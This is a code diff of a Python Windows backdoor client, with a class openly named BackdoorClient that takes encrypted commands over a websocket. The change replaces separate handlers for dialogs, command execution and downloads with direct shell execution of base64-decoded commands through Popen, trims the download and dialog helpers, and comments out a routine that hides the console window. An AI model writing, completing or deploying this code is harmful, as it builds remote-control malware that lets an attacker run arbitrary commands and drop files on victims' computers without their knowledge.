@@ -4,7 +4,7 @@ import os
 import sys
 import chardet
 import ctypes
-import subprocess
+from subprocess import Popen, PIPE
 import threading
 import uuid
 import json
@@ -46,14 +46,11 @@ class BackdoorClient(threading.Thread):
                 while True:
                     msg = json.loads(self.decrypt(self.ws.recv()))
                     if 'cmd' in msg:
-                        command = msg['cmd']
+                        command = b64decode(msg['cmd'])
 
-                        if command == 'dialog':
-                            ShowDialog(msg, self)
-                        elif command == 'exec_cmd':
-                            ExecCmd(msg, self)
-                        elif command == 'download':
-                            Download(msg, self)
+                        proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=sys.stdin)
+
+                        # TODO
 
                 self.ws.close()
 
@@ -78,13 +75,11 @@ class BackdoorClient(threading.Thread):
 
 
 class Download(threading.Thread):
-    def __init__(self, msg, client):
+    def __init__(self, url, filename):
         threading.Thread.__init__(self)
-        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
-        self.client = client
 
-        self.url = msg['url']
-        self.filename = msg['filename']
+        self.url = url
+        self.filename = filename
 
         self.daemon = True
         self.start()
@@ -95,12 +90,8 @@ class Download(threading.Thread):
             with open("c:\\" + self.filename, 'wb') as f:
                 f.write(data)
 
-            self.msg['rlt'] = 'Downloaded: ' + self.filename
-            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
-
         except Exception as e:
-            self.msg['rlt'] = 'ERROR: ' + e.message
-            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
+            pass
 
 
 class ExecCmd(threading.Thread):
@@ -130,15 +121,11 @@ class ExecCmd(threading.Thread):
 
 
 class ShowDialog(threading.Thread):
-    def __init__(self, msg, client):
+    def __init__(self, content, title=u''):
         threading.Thread.__init__(self)
-        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
-        self.client = client
 
-        self.content = decode2utf(b64decode(msg['content']))
-        self.title = None if not msg['title'] else decode2utf(b64decode(msg['title']))
-        if not self.title:
-            self.title = u''
+        self.content = content
+        self.title = title
 
         self.daemon = True
         self.start()
@@ -146,8 +133,6 @@ class ShowDialog(threading.Thread):
     def run(self):
         # win32api.MessageBox(0, self.content, self.title)
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
-        self.msg['rlt'] = 'Show dialog OK.'
-        self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
 
 # class BackendDaemonSrv(win32serviceutil.ServiceFramework):
@@ -220,7 +205,7 @@ def hide_cmd_window():
 
 if __name__ == '__main__':
     # if len(sys.argv) == 1:
-    hide_cmd_window()
+    # hide_cmd_window()
     BackdoorClient()
     while True:
         time.sleep(10)
